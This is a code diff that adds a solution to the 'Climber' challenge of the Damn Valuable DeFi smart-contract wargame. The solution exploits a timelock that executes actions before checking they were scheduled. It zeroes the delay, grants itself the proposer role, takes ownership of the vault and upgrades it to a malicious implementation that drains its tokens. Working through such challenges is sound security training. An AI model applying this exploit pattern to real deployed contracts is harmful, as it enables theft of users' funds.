@@ -7,6 +7,8 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {ClimberAttack} from "../../src/climber/ClimberAttack.sol";
+import {ClimberVaultV2} from "../../src/climber/ClimberVaultV2.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +87,39 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
+        ClimberAttack attacker = new ClimberAttack(
+            address(timelock),
+            address(vault),
+            player
+        );
+
+        bytes[] memory actions = new bytes[](4);
+        uint256[] memory values = new uint256[](4);
+        address[] memory targets = new address[](4);
         
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(vault);
+        targets[3] = address(attacker);
+
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+
+        actions[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        actions[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(attacker));
+        actions[2] = abi.encodeWithSignature("transferOwnership(address)", player);
+        actions[3] = abi.encodeWithSignature("attack()");
+
+        timelock.execute(targets, values, actions, "");
+
+        ClimberVaultV2 maliciousVaultImplementation = new ClimberVaultV2();
+
+        vault.upgradeToAndCall(
+            address(maliciousVaultImplementation), 
+            abi.encodeWithSignature("stealFunds(address,address)", address(token), recovery)
+        );
     }
 
     /**
